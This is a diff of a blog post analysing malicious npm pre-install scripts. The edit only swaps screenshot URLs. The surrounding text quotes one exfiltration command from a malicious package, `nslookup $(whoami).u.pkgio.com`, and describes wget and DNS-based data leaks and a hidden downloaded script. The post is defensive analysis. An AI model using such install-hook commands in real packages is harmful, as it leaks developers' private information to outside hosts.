@@ -36,7 +36,7 @@ Let's see just how much of a bad idea install scripts can be, by looking at five
 
 The pre-install script for the package attempted to silently exfiltrate data:
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558729399/981c32ce-b855-4017-a495-c9a038b1b446.png align="center")
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681560169080/6ecd94c0-b5ed-4056-8e59-a7d12e24e109.png align="center")
 
 This script pings a URL that is constructed using several commands that expose private information about your development machine:
 
@@ -53,7 +53,7 @@ The `--quiet` option for `wget` is a command-line option that instructs `wget` t
 
 `@primeo/address` was live for four days in December 2021, and only had a single version, but with a very elaborate install script:
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558815197/c4e15c07-92ea-416a-915d-ca29abf77cb0.png align="center")
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681560147813/b74e9d64-a2ff-46af-aa1e-b172a741eeb4.png align="center")
 
 1. `nslookup $(whoami).u.pkgio.com`: This command looks up the IP address associated with the hostname `$(whoami).u.pkgio.com` using the `nslookup` tool.
     
@@ -68,7 +68,7 @@ The `--quiet` option for `wget` is a command-line option that instructs `wget` t
 
 `@ovh-ui/oui-checkbox` was live for about a week in June 2022 and seems to be part of a bug bounty program by French company Sekost. It tried to further evade detection by using DNS requests instead of HTTP:
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558843551/14b16a20-071b-4347-840d-9aaec27f1a45.png align="center")
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681560127777/645dd48b-336c-4b2b-83a4-8cfac5fbbb45.png align="center")
 
 When you run the `dig` command with a domain name, it sends a DNS query to a DNS server and retrieves the corresponding DNS records for that domain. This can be useful for troubleshooting DNS issues, verifying DNS configurations, or performing DNS reconnaissance.
 
@@ -84,11 +84,11 @@ In addition, malware can use `dig` to perform DNS tunneling, which is a techniqu
 
 Version 1.3.3 implemented a naive approach by using `wget` to download a Python script and save it to the user's home directory, as a hidden file, inconspicuously named `.vim.hint`:
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558876362/5288a4d9-9118-4f7d-ac49-16fdbf13b933.png align="center")
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681560093142/d644e711-4287-4be4-991e-8b1da243c7e4.png align="center")
 
 By version 1.3.4 though, the pre-install script got a bit smarter:
 
-![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558910178/5b349762-adda-49cb-aacc-f6ed154bf1ef.png align="center")
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681560073003/fc3cd62b-15d8-4f3d-a7e1-912ee2f10f50.png align="center")
 
 Here is a breakdown of what the command above does:
 
